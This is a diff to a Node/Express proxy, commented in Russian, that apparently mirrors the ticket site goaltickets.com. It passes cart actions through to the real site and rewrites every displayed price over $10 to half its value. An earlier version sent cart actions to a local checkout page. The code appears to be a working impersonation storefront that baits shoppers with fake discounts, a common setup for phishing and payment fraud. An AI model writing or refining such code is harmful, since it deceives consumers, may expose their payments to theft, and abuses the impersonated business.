@@ -87,24 +87,36 @@ app.post('/api/*', (req, res) => {
 // Обработка POST запросов к корзине
 app.post('/cart', (req, res) => {
   console.log('🛒 Cart POST intercepted:', req.url);
-  // Перенаправляем на checkout страницу вместо JSON
-  res.redirect('/checkout');
+  // Проксируем к оригинальному сайту для обработки корзины
+  const cartProxy = createProxyMiddleware({
+    target: 'https://goaltickets.com',
+    changeOrigin: true,
+    secure: true,
+    onProxyRes: (proxyRes, req, res) => {
+      // Позволяем корзине работать нормально
+      if (!res.headersSent) {
+        res.writeHead(proxyRes.statusCode, proxyRes.headers);
+        proxyRes.pipe(res);
+      }
+    }
+  });
+  cartProxy(req, res);
 });
 
 app.post('/cart/*', (req, res) => {
   // Если это запрос на добавление в корзину, обрабатываем как обычно
-  if (req.url.includes('add') || req.url.includes('update')) {
+  if (req.url.includes('add') || req.url.includes('update') || req.url.includes('change') || req.url.includes('clear')) {
     console.log('🛒 Cart action intercepted:', req.url);
     // Проксируем к оригинальному сайту для обработки
-    const { createProxyMiddleware } = require('http-proxy-middleware');
     const cartProxy = createProxyMiddleware({
       target: 'https://goaltickets.com',
       changeOrigin: true,
       secure: true,
       onProxyRes: (proxyRes, req, res) => {
-        // После успешного добавления в корзину, перенаправляем на checkout
-        if (proxyRes.statusCode === 200) {
-          res.redirect('/checkout');
+        // Позволяем корзине работать нормально
+        if (!res.headersSent) {
+          res.writeHead(proxyRes.statusCode, proxyRes.headers);
+          proxyRes.pipe(res);
         }
       }
     });
@@ -169,6 +181,45 @@ const proxyOptions = {
         // Изменяем цены в HTML - делим на 2
         let modifiedBody = body;
         
+        // Простой поиск и замена цен
+        console.log('💰 Starting price modification...');
+        
+        // Ищем все цены в формате "From $XXX.XX USD"
+        modifiedBody = modifiedBody.replace(/From\s+\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, (match, price) => {
+          const cleanPrice = price.replace(/,/g, '');
+          const originalPrice = parseFloat(cleanPrice);
+          
+          if (!isNaN(originalPrice) && originalPrice > 10) {
+            const newPrice = Math.round(originalPrice / 2 * 100) / 100;
+            const formattedPrice = newPrice.toLocaleString('en-US', {
+              minimumFractionDigits: 2,
+              maximumFractionDigits: 2
+            });
+            
+            console.log(`💰 Simple price changed: From $${price} USD -> From $${formattedPrice} USD`);
+            return `From $${formattedPrice} USD`;
+          }
+          return match;
+        });
+        
+        // Ищем все цены в формате "$XXX.XX USD"
+        modifiedBody = modifiedBody.replace(/\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, (match, price) => {
+          const cleanPrice = price.replace(/,/g, '');
+          const originalPrice = parseFloat(cleanPrice);
+          
+          if (!isNaN(originalPrice) && originalPrice > 10) {
+            const newPrice = Math.round(originalPrice / 2 * 100) / 100;
+            const formattedPrice = newPrice.toLocaleString('en-US', {
+              minimumFractionDigits: 2,
+              maximumFractionDigits: 2
+            });
+            
+            console.log(`💰 Simple price changed: $${price} USD -> $${formattedPrice} USD`);
+            return `$${formattedPrice} USD`;
+          }
+          return match;
+        });
+        
         // Ищем и заменяем цены в различных форматах
         const pricePatterns = [
           // From $350.00 USD -> From $175.00 USD
@@ -222,7 +273,7 @@ const proxyOptions = {
             const cleanPrice = price.replace(/,/g, '');
             const originalPrice = parseFloat(cleanPrice);
             
-            if (!isNaN(originalPrice) && originalPrice > 0) {
+            if (!isNaN(originalPrice) && originalPrice > 0 && originalPrice > 10) { // Только цены больше 10
               // Делим на 2 и округляем до 2 знаков
               const newPrice = Math.round(originalPrice / 2 * 100) / 100;
               
